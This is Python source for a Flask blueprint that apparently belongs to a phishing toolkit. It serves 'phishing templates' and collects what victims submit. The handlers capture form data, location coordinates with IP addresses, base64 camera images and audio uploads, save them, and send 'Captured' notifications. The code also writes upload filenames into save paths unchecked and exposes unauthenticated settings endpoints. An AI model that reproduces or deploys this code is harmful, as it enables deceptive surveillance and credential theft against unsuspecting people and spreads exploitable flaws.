"""templates blueprint (P3 batch extract)."""
from __future__ import annotations

import os, json, base64
import uuid as uuid_module
from datetime import datetime, timedelta
from functools import wraps
from flask import (Blueprint, request, jsonify, redirect, url_for, render_template, send_from_directory, make_response, session, Response)
from app.state import *  # noqa: F401,F403  -- P3
from app.state import BASE_DIR, CONFIG, _decode_data_url, _save_mobile_capture
import database as db

bp = Blueprint("templates", __name__,
               template_folder=os.path.join(BASE_DIR, "flask_templates"))


@bp.route('/list_templates')
def list_templates():
    PATH = os.path.join(BASE_DIR, 'templates')
    # Only return directories that are phishing templates (not Flask template files like login.html, panel.html)
    files = [f for f in os.listdir(PATH) if os.path.isdir(os.path.join(PATH, f)) and not f.startswith('.')]
    return json.dumps(files)

@bp.route('/list_templates.php', methods=['GET', 'POST'])
def list_templates_php():
    PATH = os.path.join(BASE_DIR, 'templates')
    # Only return directories that are phishing templates (not Flask template files)
    files = [f for f in os.listdir(PATH) if os.path.isdir(os.path.join(PATH, f)) and not f.startswith('.')]
    return json.dumps(files)


# P3.2: moved to app.blueprints.capture_* -> @receiver_php ('/receiver.php')

@bp.route('/t/<name>/')
def serve_template_index(name):
    dirpath = os.path.join(TEMPLATES_DIR, name)
    if os.path.isdir(dirpath):
        return send_from_directory(dirpath, 'index.html')
    return 'Not found', 404

@bp.route('/api/save_settings', methods=['POST'])
def save_settings():
    try:
        data = request.json
        settings = {}
        if os.path.exists('Settings.json'):
            with open('Settings.json', 'r') as f:
                settings = json.load(f)
        
        settings.update(data)
        
        with open('Settings.json', 'w') as f:
            json.dump(settings, f)
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@bp.route('/api/get_settings')
def get_settings():
    if os.path.exists('Settings.json'):
        with open('Settings.json', 'r') as f:
            return jsonify(json.load(f))
    return jsonify({})

@bp.route('/t/<name>/<path:filename>', methods=['GET', 'POST'])
def serve_template_file(name, filename):
    dirpath = os.path.join(TEMPLATES_DIR, name)
    if not os.path.isdir(dirpath):
        return 'Not found', 404

    # Handle PHP file POSTs (catch-all for capture.php, result.php, etc.)
    if filename.endswith('.php'):
        if request.method == 'POST':
            if 'upload' in filename:
                return template_upload_php(name)
            return template_post(name)
        # Don't serve PHP source code
        return 'OK'

    return send_from_directory(dirpath, filename)

@bp.route('/t/<name>/handler', methods=['POST'])
def template_handler(name):
    dirpath = os.path.join(TEMPLATES_DIR, name)
    if not os.path.isdir(dirpath):
        return 'Not found', 404
    data = request.form.get('data')
    if data is None:
        return 'No data', 400
    
    # Send notification
    if "Google Map Link" in data:
        send_notification({
            "type": "Location Captured",
            "content": data,
            "template": name,
            "timestamp": datetime.now().isoformat()
        })
        # Extract coords for analytics map
        try:
            import urllib.parse
            url_match = re.search(r'q=([-\d.]+),([-\d.]+)', data)
            if url_match:
                ANALYTICS['geo_data'].append({
                    'lat': float(url_match.group(1)),
                    'lng': float(url_match.group(2)),
                    'template': name,
                    'timestamp': datetime.now().isoformat(),
                    'ip': request.remote_addr
                })
                ANALYTICS['total_locations'] += 1
        except:
            pass
        track_event('location_capture', {'template': name}, request.remote_addr)
    else:
        send_notification({
            "type": "Data Captured",
            "content": data,
            "template": name,
            "timestamp": datetime.now().isoformat()
        })

    result_file = os.path.join(dirpath, 'result.txt')
    with open(result_file, 'w', encoding='utf-8') as f:
        f.write(data)
    return 'OK'

@bp.route('/t/<name>/post', methods=['POST'])
def template_post(name):
    dirpath = os.path.join(TEMPLATES_DIR, name)
    if not os.path.isdir(dirpath):
        return 'Not found', 404

    # 1. Handle Image Uploads (base64)
    # 'cat' is used by camera_temp, 'image' by job_application
    img_data = request.form.get('cat') or request.form.get('image')
    
    if img_data:
        try:
            # Clean up headers if present (data:image/png;base64,)
            if ',' in img_data:
                img_data = img_data.split(',')[1]
            
            # Handle space to plus conversion for base64
            img_data = img_data.replace(' ', '+')
            
            decoded_data = base64.b64decode(img_data)
            fname = 'cam' + datetime.utcnow().strftime('%d%Y%H%M%S') + '.png'
            images_dir = os.path.join(BASE_DIR, 'images')
            os.makedirs(images_dir, exist_ok=True)
            imgpath = os.path.join(images_dir, fname)
            with open(imgpath, 'wb') as f:
                f.write(decoded_data)
            
            # write to result.txt
            result_file = os.path.join(dirpath, 'result.txt')
            with open(result_file, 'w', encoding='utf-8') as f:
                f.write('Image File Was Saved ! > /images/' + fname)
            
            send_notification({
                "type": "Image Captured",
                "filename": fname,
                "template": name,
                "timestamp": datetime.now().isoformat()
            })
            return 'OK'
        except Exception as e:
            print(f"Image Save Error: {e}")
            return 'Error: ' + str(e), 500

    # 2. Handle Text Data
    # If 'data' exists (standard templates), use it.
    # Otherwise, collect ALL form fields (job_application, etc.)
    data = request.form.get('data')
    
    if not data and len(request.form) > 0:
        # Construct specific formatted data string from all fields
        lines = []
        for key, value in request.form.items():
            if key not in ['cat', 'image']:
                lines.append(f"{key}: {value}")
        data = "\n".join(lines)

    if data:
        result_file = os.path.join(dirpath, 'result.txt')
        with open(result_file, 'w', encoding='utf-8') as f:
            f.write(data)
        send_notification({
            "type": "Data Captured",
            "content": data,
            "template": name,
            "timestamp": datetime.now().isoformat()
        })
        return 'OK'

    return 'No data', 400

@bp.route('/t/<name>/upload.php', methods=['POST'])
def template_upload_php(name):
    # Generic file handler - take the first file found
    if not request.files:
        return 'No file part', 400
    
    # Get the first file uploaded, regardless of the key ('audio_data', 'audio_file', etc.)
    file = next(iter(request.files.values()))
    
    if file.filename == '':
        return 'No selected file', 400
        
    if file:
        filename = file.filename
        # Ensure extension
        if not filename.endswith('.wav'):
            filename += '.wav'
            
        sounds_dir = os.path.join(BASE_DIR, 'sounds')
        os.makedirs(sounds_dir, exist_ok=True)
        save_path = os.path.join(sounds_dir, filename)
        file.save(save_path)
        
        # Write to result.txt
        dirpath = os.path.join(TEMPLATES_DIR, name)
        result_file = os.path.join(dirpath, 'result.txt')
        with open(result_file, 'w', encoding='utf-8') as f:
            f.write(f"Audio File Was Saved ! > /sounds/{filename}")
            
        send_notification({
            "type": "Audio Captured",
            "filename": filename,
            "template": name,
            "timestamp": datetime.now().isoformat()
        })
        return 'OK'
    return 'Error', 500


# ---------------------------------------------------------------------------
# P3.23: legacy .php aliases moved verbatim from app.py
# ---------------------------------------------------------------------------
@bp.route('/t/<name>/post.php', methods=['POST'])
def template_post_php(name):
    return template_post(name)
@bp.route('/t/<name>/handler.php', methods=['POST'])
def template_handler_php(name):
    return template_handler(name)
